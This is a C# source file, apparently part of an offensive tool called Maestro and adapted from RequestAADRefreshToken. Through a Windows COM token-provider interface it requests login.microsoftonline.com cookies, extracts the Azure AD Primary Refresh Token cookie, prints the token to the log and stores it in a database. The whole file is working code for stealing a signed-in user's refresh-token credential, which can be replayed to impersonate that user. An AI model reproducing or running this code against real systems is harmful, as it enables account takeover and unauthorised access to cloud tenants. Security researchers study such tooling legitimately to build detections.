//
// Lee Chagolla-Christensen (@tifkin_) is the original author of this file. Thank you, Lee!
// https://github.com/leechristensen/RequestAADRefreshToken
// https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30
//

using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Policy;

namespace Maestro
{
    [StructLayout(LayoutKind.Sequential)]
    public class ProofOfPossessionCookieInfo
    {
        public string Name { get; set; }
        public string Data { get; set; }
        public uint Flags { get; set; }
        public string P3PHeader { get; set; }
    }

    public static class ProofOfPossessionCookieInfoManager
    {
        // All these are defined in the Win10 WDK
        [Guid("CDAECE56-4EDF-43DF-B113-88E4556FA1BB")]
        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        internal interface IProofOfPossessionCookieInfoManager
        {
            int GetCookieInfoForUri(
                [MarshalAs(UnmanagedType.LPWStr)] string Uri,
                out uint cookieInfoCount,
                out IntPtr output
            );
        }

        [Guid("A9927F85-A304-4390-8B23-A75F1C668600")]
        [ComImport]
        private class WindowsTokenProvider
        {
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UnsafeProofOfPossessionCookieInfo
        {
            public readonly IntPtr NameStr;
            public readonly IntPtr DataStr;
            public readonly uint Flags;
            public readonly IntPtr P3PHeaderStr;
        }

        public static IEnumerable<ProofOfPossessionCookieInfo> GetCookieInfoForUri(string uri)
        {
            var provider = (IProofOfPossessionCookieInfoManager)new WindowsTokenProvider();
            var res = provider.GetCookieInfoForUri(uri, out uint count, out var ptr);

            if (count <= 0)
                yield break;

            var offset = ptr;
            for (int i = 0; i < count; i++)
            {
                var info = (UnsafeProofOfPossessionCookieInfo)Marshal.PtrToStructure(offset, typeof(UnsafeProofOfPossessionCookieInfo));

                var name = Marshal.PtrToStringUni(info.NameStr);
                var data = Marshal.PtrToStringUni(info.DataStr);
                var flags = info.Flags;
                var p3pHeader = Marshal.PtrToStringUni(info.P3PHeaderStr);


                yield return new ProofOfPossessionCookieInfo()
                {
                    Name = name,
                    Data = data,
                    Flags = flags,
                    P3PHeader = p3pHeader
                };

                Marshal.FreeCoTaskMem(info.NameStr);
                Marshal.FreeCoTaskMem(info.DataStr);
                Marshal.FreeCoTaskMem(info.P3PHeaderStr);

                offset = (IntPtr)(offset.ToInt64() + Marshal.SizeOf(typeof(ProofOfPossessionCookieInfo)));
            }

            Marshal.FreeCoTaskMem(ptr);
        }
    }

    public class RequestAADRefreshToken
    {
        public static List<PrtCookie> GetPrtCookies(LiteDBHandler database, string nonce = null)
        {
            var prtCookies = new List<PrtCookie>();

            try
            {
                // This will likely always be the URL.
                // BrowserCore specifically looks in SOFTWARE\Microsoft\IdentityStore\LoadParameters\{B16898C6-A148-4967-9171-64D755DA8520} ! IDStoreLoadParametersAad
                // and SOFTWARE\Microsoft\Windows\CurrentVersion\AAD\Package ! LoginUri
                string uri = "";

                if (!string.IsNullOrEmpty(nonce))
                {
                    Logger.Info($"Using supplied nonce: {nonce}");
                    uri = $"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}";
                }
                else
                {
                    Logger.Warning("No nonce supplied, refresh cookie will likely not work");
                    uri = $"https://login.microsoftonline.com/" ;
                }

                var cookies = ProofOfPossessionCookieInfoManager
                    .GetCookieInfoForUri(uri)
                    .ToList();

                if (cookies.Any())
                {
                    foreach (var c in cookies)
                    {
                        if (c.Name == "x-ms-RefreshTokenCredential")
                        {
                            // This is the PRT cookie
                            string parsedPrtCookie = c.Data.Split(';').FirstOrDefault(x => x.Contains("eyJh"));
                            Logger.Info($"Found PRT cookie: {parsedPrtCookie}");
                            PrtCookie prtCookie = new PrtCookie(parsedPrtCookie, database);
                            prtCookies.Add(prtCookie);
                        }
                    }
                }
                else
                {
                    Logger.Warning($"No PRT found for this device+user");
                }
            }
            catch (Exception e)
            {
                Logger.Error("Unhandled exception while requesting PRT cookies from LSA:CloudAP: " + e);
            }

            return prtCookies;
        }
    }
}
